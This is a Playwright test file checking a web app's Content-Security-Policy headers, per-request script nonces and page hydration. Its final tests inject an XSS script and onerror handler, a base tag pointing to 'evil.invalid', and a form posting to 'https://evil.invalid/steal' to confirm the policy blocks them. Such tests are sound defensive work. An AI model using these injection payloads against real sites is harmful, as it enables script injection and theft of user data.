import { test, expect } from "@playwright/test";

const PATHS = ["/", "/company/NVDA", "/methodology", "/about", "/does-not-exist", "/apiary", "/api-docs"];

const parse = (csp) =>
  Object.fromEntries(
    csp.split(";").map((d) => d.trim()).filter(Boolean).map((d) => [d.split(" ")[0], d.split(" ").slice(1).join(" ")])
  );
const NONCE_RE = /^'self' 'nonce-([A-Za-z0-9+/=]+)' 'strict-dynamic'$/;

for (const p of PATHS) {
  test(`security headers are present on ${p}`, async ({ request }) => {
    const res = await request.get(p);
    const h = res.headers();
    expect(h["content-security-policy"], "Content-Security-Policy").toBeTruthy();
    const d = parse(h["content-security-policy"]);
    expect(d["default-src"]).toBe("'self'");
    expect(d["img-src"]).toBe("'self' data:");
    expect(d["style-src"]).toBe("'self' 'unsafe-inline'");
    // Scripts: self + a per-request nonce, never 'unsafe-inline'.
    expect(d["script-src"]).toMatch(NONCE_RE);
    expect(h["content-security-policy"]).not.toMatch(/script-src[^;]*'unsafe-inline'/);
    expect(d["base-uri"]).toBe("'self'");
    expect(d["form-action"]).toBe("'self'");
    expect(d["frame-ancestors"]).toBe("'none'");
    expect(h["x-content-type-options"]).toBe("nosniff");
    expect(h["referrer-policy"]).toBe("strict-origin-when-cross-origin");
  });
}

test("a page carries exactly one CSP header (a second one would be intersected and block the nonce)", async ({ request }) => {
  const res = await request.get("/");
  const csps = res.headersArray().filter((h) => h.name.toLowerCase() === "content-security-policy");
  expect(csps).toHaveLength(1);
});

test("the nonce is fresh per request and is the one on the page's own scripts", async ({ request }) => {
  const nonces = [];
  for (let i = 0; i < 2; i++) {
    const res = await request.get("/about");
    const nonce = res.headers()["content-security-policy"].match(/'nonce-([^']+)'/)[1];
    const html = await res.text();
    expect(html).toContain(`nonce="${nonce}"`);
    // Every script tag with inline content carries it.
    for (const tag of html.match(/<script\b[^>]*>/g) ?? []) expect(tag).toContain(`nonce="${nonce}"`);
    nonces.push(nonce);
  }
  expect(nonces[0]).not.toBe(nonces[1]);
});

test("the API route carries the headers too, with the same policy and no nonce", async ({ request }) => {
  const res = await request.post("/api/requests", { headers: { "x-forwarded-for": "203.0.113.80" }, data: {} });
  expect(res.status()).toBe(400);
  const d = parse(res.headers()["content-security-policy"]);
  expect(d["script-src"]).toBe("'self'");
  expect(d["default-src"]).toBe("'self'");
  expect(d["base-uri"]).toBe("'self'");
  expect(d["form-action"]).toBe("'self'");
  expect(d["frame-ancestors"]).toBe("'none'");
  expect(res.headers()["x-content-type-options"]).toBe("nosniff");
  expect(res.headers()["referrer-policy"]).toBe("strict-origin-when-cross-origin");
});

// If Next's own bootstrap scripts were blocked, a console violation would appear and client components would
// stay inert.
test("the policy does not block the app's own scripts, and pages still hydrate", async ({ page }) => {
  const violations = [];
  page.on("console", (m) => {
    if (/content security policy/i.test(m.text())) violations.push(m.text());
  });
  page.on("pageerror", (e) => violations.push(String(e)));
  for (const p of ["/", "/company/NVDA", "/compare", "/misses", "/methodology", "/about"]) {
    await page.goto(p);
    await page.waitForLoadState("networkidle");
  }
  expect(violations).toEqual([]);

  await page.goto("/");
  // Only a hydrated form calls the API instead of navigating.
  await page.getByLabel("Company name or ticker", { exact: true }).fill("Costco");
  await page.getByLabel("Email").fill(`csp-${Date.now()}@example.com`);
  await page.getByLabel("Role").selectOption("CIO");
  const [res] = await Promise.all([
    page.waitForResponse((r) => r.url().includes("/api/requests")),
    page.getByRole("button", { name: "Request a company" }).click(),
  ]);
  expect([200, 429]).toContain(res.status());
  expect(new URL(page.url()).pathname).toBe("/");
});

// Simulates the XSS the policy is for: the server response is altered in flight to carry an attacker's inline
// script and inline handler, neither with the page's nonce. The browser must refuse to run both.
test("an inline script and an inline handler without the nonce do not run", async ({ page }) => {
  const violations = [];
  page.on("console", (m) => {
    if (/content security policy/i.test(m.text())) violations.push(m.text());
  });
  await page.route("**/about", async (route) => {
    const response = await route.fetch();
    const body = (await response.text()).replace(
      "</body>",
      '<script>window.__injected = "script"</script><img src="data:," onerror="window.__injected = \'handler\'"></body>'
    );
    await route.fulfill({ response, body });
  });
  await page.goto("/about");
  await page.waitForLoadState("networkidle");
  expect(await page.evaluate(() => window.__injected)).toBeUndefined();
  expect(violations.length).toBeGreaterThan(0);
});

// base-uri: an injected <base> pointing off-site would re-aim every relative script and link. The browser must ignore it.
test("an injected <base> to another origin is ignored", async ({ page }) => {
  const violations = [];
  page.on("console", (m) => {
    if (/content security policy/i.test(m.text())) violations.push(m.text());
  });
  await page.route("**/about", async (route) => {
    const response = await route.fetch();
    const body = (await response.text()).replace("<head>", '<head><base href="https://evil.invalid/">');
    await route.fulfill({ response, body });
  });
  await page.goto("/about");
  await page.waitForLoadState("networkidle");
  const baseURI = await page.evaluate(() => document.baseURI);
  expect(new URL(baseURI).origin).toBe(new URL(page.url()).origin);
  expect(violations.some((v) => /base-uri/.test(v))).toBe(true);
});

// form-action: an injected form (or a changed action on the real one) must not be able to post off-site.
test("a form that posts to another origin is blocked", async ({ page }) => {
  const violations = [];
  const requested = [];
  page.on("console", (m) => {
    if (/content security policy/i.test(m.text())) violations.push(m.text());
  });
  page.on("request", (r) => requested.push(r.url()));
  await page.goto("/about");
  await page.evaluate(() => {
    const f = document.createElement("form");
    f.method = "post";
    f.action = "https://evil.invalid/steal";
    f.id = "injected-form";
    document.body.appendChild(f);
    f.requestSubmit();
  });
  await page.waitForTimeout(500);
  expect(violations.some((v) => /form-action/.test(v))).toBe(true);
  expect(new URL(page.url()).pathname).toBe("/about");
  expect(requested.some((u) => u.includes("evil.invalid"))).toBe(false);
});
